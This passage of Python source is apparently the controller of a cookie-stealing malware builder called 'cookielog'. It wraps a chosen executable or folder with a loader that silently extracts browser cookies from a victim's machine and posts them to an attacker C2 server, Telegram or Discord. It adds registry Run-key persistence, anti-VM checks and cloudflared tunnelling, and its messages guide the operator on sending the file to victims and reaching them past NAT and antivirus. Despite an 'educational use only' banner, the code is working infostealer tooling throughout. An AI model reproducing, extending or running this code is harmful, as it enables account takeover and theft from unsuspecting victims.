                    log("  saved keys in config.json: yes (but not active for this session)")
                else:
                    log("  saved keys in config.json: no")
            log("")
            log("  to set:    telegram <token:chat_id>  /  discord <webhook_url>")
            log("  to disable: clear-telegram           /  clear-discord")
            log("  (clear removes from config.json; to re-enable, re-enter the key)")

        elif cmd == "gui":
            # Launch GUI picker, then run the full flow.
            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm, gui_tunnel = pick_gui()
            if not host_path:
                log("[-] nothing selected")
                continue
            # GUI values are authoritative (None = relay disabled by checkbox).
            telegram = gui_tg
            discord = gui_dc
            persist = gui_persist
            gui_port = port
            if gui_tunnel:
                # The tunnel forwards to the loopback listener; the GUI's Port
                # field is authoritative, not the URL that will be replaced.
                gui_port = int(load_config().get("port", port) or port)
            elif gui_c2:
                try:
                    info = parse_c2_url(gui_c2, fallback_port=port)
                    gui_port = info["port"]
                except ValueError as ex:
                    log("[-] invalid C2 URL from the GUI: %s" % ex)
                    continue
                if info["loopback"] and not gui_run:
                    log("[-] refusing a loopback C2 for a remote victim: %s" % info["url"])
                    continue
            run_one(host_path, mode, gui_run, gui_port, telegram, discord,
                    persist, gui_avm, gui_c2, gui_tunnel)

        elif cmd == "infect":
            if not rest:
                log("usage: infect <path> [--run] [--persist]")
                log("  path can be a folder or a .exe")
                log("  --run: run locally after infecting (test)")
                continue
            # Parse the rest
            sub = rest.split()
            host_path = ""
            run_flag = False
            persist_flag = persist  # Inherit current
            j = 0
            while j < len(sub):
                if sub[j] == "--run":
                    run_flag = True
                elif sub[j] == "--persist":
                    persist_flag = True
                else:
                    if host_path:
                        host_path += " " + sub[j]
                    else:
                        host_path = sub[j]
                j += 1

            if not os.path.exists(host_path):
                log("[-] path does not exist: %s" % host_path)
                continue

            if os.path.isdir(host_path):
                mode = "folder"
            else:
                mode = "file"

            if persist_flag and not persist:
                persist = True
                cfg["persist"] = True
                save_config(cfg)

            run_one(host_path, mode, run_flag, port, telegram, discord, persist_flag)

        else:
            log("invalid command: '%s' -- type 'help' for command list" % cmd)


def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_anti_vm=False, c2_override=None, tunnel=False):
    """Execute the full infect flow for a single target."""
    log("=" * 60)
    log("  cookielog -- infecting %s" % os.path.basename(host_path))
    log("=" * 60)

    # 1. Ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return

    # 2. Detect IP
    log("\n[2/5] detecting attacker IP...")
    if c2_override and not tunnel:
        try:
            info = parse_c2_url(c2_override, fallback_port=port)
        except ValueError as ex:
            log("[-] invalid C2 URL: %s" % ex)
            return
        port = info["port"]
        c2_url = info["url"]
        ip = info["host"]
        if info["loopback"] and not run_local:
            log("[-] refusing a loopback C2 for a remote victim: %s" % c2_url)
            return
        log("[+] C2 URL (manual): %s" % c2_url)
    else:
        ip = detect_ip()
        c2_url = "http://%s:%d/" % (ip, port)
        if tunnel:
            log("[*] C2: cloudflared quick tunnel (public URL after the listener starts)")
        else:
            log("[+] C2 URL: %s" % c2_url)
    telegram = gate_telegram(telegram)
    if discord:
        log("[+] Discord relay: enabled")
    if persist:
        log("[+] Persistence: enabled (registry Run key)")
    if no_anti_vm:
        log("[+] Anti-VM: DISABLED (--no-anti-vm)")
    if not c2_override and not tunnel and ip != "127.0.0.1" and _is_private_ip(ip):
        log("[!] WARNING: IP %s is LAN/private -- external machines can't reach it." % ip)
        log("[!]   Use --c2 http://YOUR_PUBLIC_IP:%d/ for external targets." % port)
    if run_local:
        c2_url = "http://127.0.0.1:%d/" % port
        log("[+] C2 URL (local test): %s" % c2_url)

    # A manually supplied remote endpoint is already served elsewhere. A quick
    # tunnel instead needs a loopback listener behind cloudflared.
    remote_c2 = bool(c2_override) and _remote_c2(c2_url, run_local) and not tunnel
    if remote_c2:
        log("\n[3/5] listener: remote C2, local listener not started")
        listener = None
    else:
        log("\n[3/5] starting listener...")
        listener = start_listener(port, telegram, discord, tunnel=tunnel)
        if not listener:
            log("[-] could not start listener")
            return
        if tunnel:
            url = start_tunnel(port)
            if not url:
                listener.terminate()
                return
            c2_url = url
            log("[+] C2 URL (tunnel): %s" % c2_url)
    # 3.5 is the C2 actually answering on that address? (best-effort, see docstring)
    ok, info = check_c2_reachable(c2_url)
    if not ok:
        log("[!] C2 %s is NOT reachable from here (%s)" % (c2_url, info))
        log("    likely causes: no port-forward on the router, a local firewall blocking")
        log("    the port, or the ISP uses CGNAT (very common on Brazilian residential")
        log("    lines -- port-forward is impossible there). Options that work anyway:")
        log("      * Telegram/Discord relay (--telegram / --discord): HTTPS outbound, no forward")
        log("      * a cheap VPS or a VPN (Tailscale/WireGuard) as the C2 host")
        log("      * keep the victim on your LAN and use the LAN IP C2")
    else:
        log("[+] C2 check: %s answers on %s" % (c2_url, info))

    # 4. infect
    log("\n[4/5] infecting...")
    try:
        if mode == "folder":
            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
            if not out_path:
                if listener is not None:
                    listener.terminate()
                return
            folder_name = os.path.basename(os.path.abspath(host_path))
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
            else:
                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
            log("=" * 60)
        else:
            out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
            bname = os.path.basename(out_path)
            log("[+] infected: ifec/apps/%s" % bname)
            log("[+] C2 URL embedded: %s" % c2_url)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        if listener is not None:
            listener.terminate()
        return

    # 5. Run locally or wait
    if run_local:
        try:
            if mode == "folder":
                run_infected_locally(None, out_path, is_folder=True)
            else:
                run_infected_locally(host_path, out_path, is_folder=False)
        except Exception as ex:
            log("[!] local run failed: %s" % ex)
            if mode == "file":
                backup = host_path + ".orig"
                if os.path.exists(backup):
                    shutil.copy2(backup, host_path)
                    os.remove(backup)
                    log("[+] original .exe restored after error")

    # 6. Wait for cookies
    if remote_c2:
        log("[*] staged for %s; loot lands on the C2 host (rsync from there)" % c2_url)
        return
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        pass
    if listener.poll() is None:
        log("[*] listener still running on port %d -- leave it up for late victims" % port)
    log("\n[*] done. cookies in loot/all_cookies.json + loot/session_cookies.json")

# ------------------------------------------------------------------ main

def main():
    # If no arguments, ask: GUI or terminal?
    if len(sys.argv) == 1:
        log("=" * 60)
        log("  cookielog -- educational security research tool")
        log("  EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH / TRAINING")
        log("=" * 60)
        log("")
        log("  [1] GUI mode      (graphical interface -- pick folder/exe)")
        log("  [2] Terminal mode (interactive command line)")
        log("  [3] Quick infect   (skip menu, use CLI args)")
        log("")
        try:
            choice = input("  choose [1/2/3] (default 1): ").strip()
        except (EOFError, KeyboardInterrupt):
            return 0

        if choice == "2" or choice.lower() == "terminal":
            interactive_loop()
            return 0
        elif choice == "3":
            log("[*] pass args: python auto.py <path> [--run] [--persist] [--telegram ...] [--discord ...]")
            return 0
        # default: GUI mode (fall through).

    port = 9090
    port_explicit = False
    host_arg = None
    run_local = False
    telegram = None
    discord = None
    persist = False
    show_cfg = False
    clear_tg = False
    clear_dc = False
    c2_override = None
    no_anti_vm = False
    find_port = False
    tunnel = False

    # Parse args
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--port" and i + 1 < len(args):
            port = int(args[i + 1]); port_explicit = True; i += 2
        elif a == "--run":
            run_local = True; i += 1
        elif a == "--cli":
            i += 1
        elif a == "--telegram" and i + 1 < len(args):
            telegram = args[i + 1]; i += 2
        elif a == "--discord" and i + 1 < len(args):
            discord = args[i + 1]; i += 2
        elif a == "--persist":
            persist = True; i += 1
        elif a == "--c2" and i + 1 < len(args):
            c2_override = args[i + 1]; i += 2
        elif a == "--no-anti-vm":
            no_anti_vm = True; i += 1
        elif a == "--find-port":
            find_port = True; i += 1
        elif a == "--tunnel":
            tunnel = True; i += 1
        elif a == "--config":
            show_cfg = True; i += 1
        elif a == "--clear-telegram":
            clear_tg = True; i += 1
        elif a == "--clear-discord":
            clear_dc = True; i += 1
        elif not a.startswith("--"):
            # Join remaining non-flag args as the host path (handles spaces).
            parts = []
            while i < len(args) and not args[i].startswith("--"):
                parts.append(args[i]); i += 1
            host_arg = " ".join(parts)
        else:
            i += 1

    # --config: show saved settings and exit
    if show_cfg:
        show_config()
        return 0

    # --clear-telegram / --clear-discord: remove from config and exit
    if clear_tg or clear_dc:
        cfg = load_config()
        if clear_tg:
            cfg.pop("telegram", None)
            log("[+] Telegram cleared from config")
        if clear_dc:
            cfg.pop("discord", None)
            log("[+] Discord cleared from config")
        save_config(cfg)
        return 0

    # Load saved config for values not passed via CLI.
    cfg = load_config()
    if telegram is None and cfg.get("telegram"):
        telegram = cfg["telegram"]
        log("[*] Telegram: loaded from config.json")
    if discord is None and cfg.get("discord"):
        discord = cfg["discord"]
        log("[*] Discord: loaded from config.json")
    if not persist and cfg.get("persist"):
        persist = True
        log("[*] Persist: loaded from config.json")
    if not port_explicit and cfg.get("port"):
        port = cfg["port"]

    # A C2 URL and the listener port must be the same number. The old flow
    # listened on --port while the payload dialled the port typed in the URL:
    # different numbers, zero deliveries.
    if c2_override:
        try:
            info = parse_c2_url(c2_override, fallback_port=port)
        except ValueError as ex:
            log("[-] invalid --c2 URL: %s" % ex)
            return 1
        if port_explicit and info["port"] != port:
            log("[!] --port %d overridden: the --c2 URL dials %d" % (port, info["port"]))
        port = info["port"]
        c2_override = info["url"]
        if info["loopback"] and not run_local and not tunnel:
            log("[-] refusing to build with a loopback C2: %s" % info["url"])
            log("    The victim would POST to its own 127.0.0.1 and you would receive nothing.")
            log("    Give the attacker LAN/public address, or add --run for a same-machine test.")
            return 1

    # --find-port: scan for a free port and use it. Never override a --c2 URL:
    # the URL is the address the payload will dial, so its port wins.
    if find_port and not c2_override:
        log("[*] scanning for a free port (9400-9500)...")
        best = find_best_port(start=9400, end=9500, preferred=port)
        if best is not None:
            if best != port:
                log("[+] found free port: %d (was %d)" % (best, port))
            else:
                log("[+] port %d is free" % best)
            port = best
        else:
            log("[-] no free port found in range 9400-9500, using %d" % port)

    # The URL is the source of truth for the port the payload dials.
    if c2_override:
        port = port_from_url(c2_override, port)

    # Save new values to config if provided via CLI.
    cfg_new = load_config()
    changed = False
    if telegram and telegram != cfg_new.get("telegram"):
        cfg_new["telegram"] = telegram
        changed = True
    if discord and discord != cfg_new.get("discord"):
        cfg_new["discord"] = discord
        changed = True
    if persist != bool(cfg_new.get("persist")):
        cfg_new["persist"] = persist
        changed = True
    if port != cfg_new.get("port"):
        cfg_new["port"] = port
        changed = True
    if changed:
        save_config(cfg_new)
        log("[+] config.json updated")

    log("=" * 60)
    log("  cookielog -- automatic payload setup")
    log("=" * 60)

    # 1. Ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return 1

    # 2. Detect IP + build C2 URL
    log("\n[2/5] detecting attacker IP...")
    ip = None
    if c2_override:
        c2_url = c2_override
        log("[+] C2 URL (manual): %s" % c2_url)
    else:
        ip = detect_ip()
        if ip.startswith("127.") and not run_local and not tunnel:
            log("[-] could not detect a usable attacker IP (got 127.0.0.1).")
            log("    A loopback C2 can never receive from a different machine.")
            log("    Use --c2 http://YOUR_LAN_OR_PUBLIC_IP:%d/ and retry." % port)
            return 1
        c2_url = "http://%s:%d/" % (ip, port)
        log("[+] C2 URL: %s" % c2_url)
    telegram = gate_telegram(telegram)
    if discord:
        log("[+] Discord relay: enabled")
    if persist:
        log("[+] Persistence: enabled (registry Run key)")
    if no_anti_vm:
        log("[+] Anti-VM: DISABLED (--no-anti-vm) — payload will run in VMs")
    if ip and ip == "127.0.0.1":
        log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
    elif ip and not c2_override and not tunnel and _is_private_ip(ip):
        log("[!] WARNING: detected IP %s is a LAN/private address." % ip)
        log("[!]   Machines outside your LAN CANNOT reach this IP.")
        log("[!]   For external targets, use:")
        log("[!]     1. Port-forward port %d on your router to this machine" % port)
        log("[!]     2. Find your public IP (e.g. https://api.ipify.org)")
        log("[!]     3. Re-run with: --c2 http://YOUR_PUBLIC_IP:%d/" % port)
        log("[!]   Or use the Telegram/Discord relay if the C2 port is firewalled.")
    if run_local:
        log("[*] mode: LOCAL TEST (will run infected exe on this machine)")
        c2_url = "http://127.0.0.1:%d/" % port
        log("[+] C2 URL (local test): %s" % c2_url)

    # 3. Get target (file or folder)
    log("\n[3/5] selecting target...")
    if host_arg:
        host_path = host_arg
        if os.path.isdir(host_path):
            mode = "folder"
        elif os.path.isfile(host_path):
            mode = "file"
        else:
            log("[-] path does not exist: %s" % host_path)
            return 1
        log("[+] target (%s): %s" % (mode, host_path))
    else:
        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm, gui_tunnel = pick_gui(tunnel)
        if not host_path:
            log("[-] nothing selected")
            return 1
        # The checkbox is authoritative once the dialog is open: --tunnel just
        # pre-checks it. With the tunnel on, the Port field owns the listener
        # and the public URL replaces whatever is in the C2 field.
        tunnel = gui_tunnel
        if tunnel:
            port = int(load_config().get("port", port) or port)
        if gui_run:
            run_local = True
            c2_url = "http://127.0.0.1:%d/" % port
        elif gui_c2 and not tunnel:
            # Use the C2 URL from the GUI (may be public IP). The URL owns the
            # port: bind the listener where the payload will dial, not on the
            # (possibly different) number in the Port field.
            try:
                info = parse_c2_url(gui_c2, fallback_port=port)
            except ValueError as ex:
                log("[-] invalid C2 URL from the GUI: %s" % ex)
                return 1
            if info["port"] != port:
                log("[!] C2 URL port %d overrides the Port field (%d)" % (info["port"], port))
            if info["loopback"] and not run_local:
                log("[-] refusing a loopback C2 for a remote victim: %s" % info["url"])
                log("    The victim would post to its own 127.0.0.1. Use this machine's")
                log("    LAN address, or tick 'RUN LOCALLY' for a same-machine test.")
                return 1
            port = info["port"]
            c2_url = info["url"]
            c2_override = info["url"]  # Prevent detect_ip from overwriting
            cfg["port"] = port
            save_config(cfg)
        if gui_avm:
            no_anti_vm = True
        # GUI values are authoritative -- if the user unchecked a relay
        # checkbox, gui_tg/gui_dc will be None, and we must NOT fall back
        # to the config value. The GUI already saved keys to config; the
        # checkbox controls whether the relay is USED for this run.
        telegram = gui_tg   # None if unchecked or empty
        discord = gui_dc    # None if unchecked or empty
        persist = gui_persist
        log("[+] target (%s): %s" % (mode, host_path))
        if tunnel:
            log("[*] C2: cloudflared quick tunnel (public URL after the listener starts)")
        else:
            log("[+] C2 URL: %s" % c2_url)
        if no_anti_vm:
            log("[+] Anti-VM: DISABLED (from GUI)")
        if run_local:
            log("[+] mode: LOCAL TEST (run locally)")
        if telegram:
            log("[+] Telegram relay: active (from GUI)")
        elif cfg.get("telegram"):
            log("[*] Telegram relay: disabled (checkbox off, key saved in config)")
        if discord:
            log("[+] Discord relay: active (from GUI)")
        elif cfg.get("discord"):
            log("[*] Discord relay: disabled (checkbox off, key saved in config)")

    # 4. A manually supplied remote endpoint is already served elsewhere;
    #    --tunnel needs a loopback listener behind cloudflared.
    remote_c2 = bool(c2_override) and _remote_c2(c2_url, run_local) and not tunnel
    if remote_c2:
        log("\n[4/5] listener: remote C2, local listener not started")
        listener = None
    else:
        log("\n[4/5] starting listener...")
        listener = start_listener(port, telegram, discord, tunnel=tunnel)
        if not listener:
            log("[-] could not start listener")
            return 1
        if tunnel:
            url = start_tunnel(port)
            if not url:
                listener.terminate()
                return 1
            c2_url = url
            log("[+] C2 URL (tunnel): %s" % c2_url)

    # 5. infect
    log("\n[5/5] infecting...")
    try:
        if mode == "folder":
            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
            if not out_path:
                if listener is not None:
                    listener.terminate()
                return 1
            folder_name = os.path.basename(os.path.abspath(host_path))
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
            else:
                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
                log("  when the victim runs it:")
                log("    - the original app/game opens normally")
                log("    - payload extracts cookies from the VICTIM's machine")
                log("    - cookies are sent via HTTP POST to %s" % c2_url)
                log("  cookies will appear in loot/all_cookies.json")
                log("")
                log("  TROUBLESHOOTING (if no data arrives):")
                log("    1. Is this listener reachable from the victim?")
                log("       -> the victim must be able to reach %s" % c2_url)
                log("    2. If C2 URL is a LAN IP (192.168.x.x), external machines")
                log("       CANNOT reach it. Use --c2 http://YOUR_PUBLIC_IP:PORT/")
                log("    3. Is the port forwarded on your router? (port %d -> this machine)" % port)
                log("    4. Is Windows Defender on the victim? It may quarantine the exe.")
                log("    5. Is the victim a VM? Use --no-anti-vm to skip VM detection.")
                log("    6. Use Telegram/Discord relay as fallback if port is firewalled.")
            log("=" * 60)
        else:
            out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
            bname = os.path.basename(out_path)
            log("[+] infected: ifec/apps/%s" % bname)
            log("    loader: %d KB + host: %d KB = %d KB" % (
                os.path.getsize(LOADER) // 1024,
                os.path.getsize(host_path) // 1024,
                os.path.getsize(out_path) // 1024))
            log("[+] C2 URL embedded: %s" % c2_url)
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running infected exe on this machine")
            else:
                log("  READY -- send ifec/apps/%s to the victim" % bname)
                log("  when the victim runs it:")
                log("    - the original app/game opens normally")
                log("    - payload extracts cookies from the VICTIM's machine")
                log("    - cookies are sent via HTTP POST to %s" % c2_url)
                log("  cookies will appear in loot/all_cookies.json")
                log("")
                log("  TROUBLESHOOTING (if no data arrives):")
                log("    1. Is this listener reachable from the victim?")
                log("       -> the victim must be able to reach %s" % c2_url)
                log("    2. If C2 URL is a LAN IP (192.168.x.x), external machines")
                log("       CANNOT reach it. Use --c2 http://YOUR_PUBLIC_IP:PORT/")
                log("    3. Is the port forwarded on your router? (port %d -> this machine)" % port)
                log("    4. Is Windows Defender on the victim? It may quarantine the exe.")
                log("    5. Is the victim a VM? Use --no-anti-vm to skip VM detection.")
                log("    6. Use Telegram/Discord relay as fallback if port is firewalled.")
            log("=" * 60)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        if listener is not None:
            listener.terminate()
        return 1

    # 6. Run locally or wait for cookies
    if run_local:
        try:
            if mode == "folder":
                run_infected_locally(None, out_path, is_folder=True)
            else:
                run_infected_locally(host_path, out_path, is_folder=False)
        except Exception as ex:
            log("[!] local run failed: %s" % ex)
            if mode == "file":
                backup = host_path + ".orig"
                if os.path.exists(backup):
                    shutil.copy2(backup, host_path)
                    os.remove(backup)
                    log("[+] original .exe restored after error")

    # 7. Wait for cookies
    if remote_c2:
        log("[*] staged for %s; loot lands on the C2 host (rsync from there)" % c2_url)
        return 0
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        log("\n[*] interrupted by user")
    # Keep the listener alive: victims often run the exe minutes or hours later,
    # terminating it here silently dropped every late delivery.
    if listener.poll() is None:
        log("[*] listener still running on port %d -- leave it up for late victims (close its window to stop)" % port)

    return 0

if __name__ == "__main__":
    sys.exit(main())
